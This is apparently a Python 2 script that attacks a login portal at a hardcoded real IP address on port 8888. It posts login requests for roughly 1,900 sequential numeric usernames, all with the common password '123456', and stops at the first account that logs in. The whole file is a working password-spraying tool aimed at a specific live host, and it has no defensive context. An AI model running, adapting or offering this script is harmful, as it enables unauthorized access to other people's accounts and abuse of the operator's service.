#coding=UTF-8

import HTMLParser
import urlparse
import urllib
import urllib2
import cookielib
import string
import sys

hosturl = 'http://220.248.195.2:8888/'
posturl = 'http://220.248.195.2:8888//login.do'

cj = cookielib.LWPCookieJar()
cookie_support = urllib2.HTTPCookieProcessor(cj)
opener = urllib2.build_opener(cookie_support,urllib2.HTTPHandler)
urllib2.install_opener(opener)

h = urllib2.urlopen(hosturl)

headers = {'User_Agent' : 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36',
           'Referer' : 'http://220.248.195.2:8888/'}

for i in range(79107083100,79107084999) : 
    postData = {'username' : '0' + str(i),
                'textPWD' : '',
                'password' : '123456',
                'wlanuerip' : '',
                'wlanacname' : '',
                'userAgent' : 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36',
                'browserType' : 'pc'
                }

    postData = urllib.urlencode(postData)

    request = urllib2.Request(posturl,postData,headers)
    response = urllib2.urlopen(request)
    text = response.read()
    if str(i) in str(text) :
        print '0' + str(i) + u'帐号上线'
        break
